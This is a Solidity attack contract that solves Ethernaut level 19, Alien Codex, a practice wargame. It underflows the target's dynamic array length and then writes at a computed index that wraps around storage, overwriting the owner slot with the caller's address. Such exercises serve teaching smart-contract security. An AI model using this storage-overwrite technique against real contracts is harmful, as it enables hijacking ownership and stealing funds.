// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/IAlienCodex.sol";

/**
 * @title Alien Codex Attack (Ethernaut Challenge Level 19 - Alien Codex)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 19
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272
 */
contract AlienCodexAttack {
    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     * @param target Address of target contract
     */
    function attack(IAlienCodex target) external {
        target.make_contact();

        require(target.contact(), "AlienCodex: Wrong res");

        target.retract();

        target.revise(
            type(uint256).max - uint256(keccak256(abi.encode(uint32(1)))) + 1,
            bytes32(bytes20(msg.sender)) >> (8 * 12)
        );

        require(msg.sender == target.owner(), "AlienCodex: Attack failed");
    }
}
